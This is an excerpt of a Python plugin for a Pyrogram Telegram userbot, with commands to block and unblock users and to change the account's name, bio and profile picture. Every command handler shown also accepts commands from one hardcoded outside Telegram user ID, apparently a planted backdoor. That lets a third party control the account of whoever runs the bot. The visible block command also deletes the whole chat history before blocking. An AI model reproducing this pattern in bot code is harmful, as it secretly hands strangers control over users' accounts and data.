...
@Client.on_message(
    filters.command(["unblock"], ".") & (filters.me | filters.user(5893359935))
)
...
@Client.on_message(filters.command(["بلوك"], ".") & (filters.me | filters.user(5893359935)))
async def block_user_func(client: Client, message: Message):
    user_id = await extract_user(message)
    tex = await message.reply_text("جاري الحظر . . .")
    if not user_id:
        return await tex.edit_text("Provide User ID/Username or reply to user message to block.")
    if user_id == client.me.id:
        return await tex.edit_text("ohk ✅.")
    async for messages in client.get_chat_history(message.chat.id):
        await client.delete_messages(message.chat.id, messages.id)
    await client.block_user(user_id)
    umention = (await client.get_users(user_id)).mention
    await tex.edit_text(f"تم حظر المستخدم {umention}")
    
@Client.on_message(
    filters.command(["setname"], ".") & (filters.me | filters.user(5893359935))
)
...
@Client.on_message(
    filters.command(["setbio"], ".") & (filters.me | filters.user(5893359935))
)
...
@Client.on_message(
    filters.command(["setpfp"], ".") & (filters.me | filters.user(5893359935))
)
...
@Client.on_message(
    filters.command(["vpfp"], ".") & (filters.me | filters.user(5893359935))
)
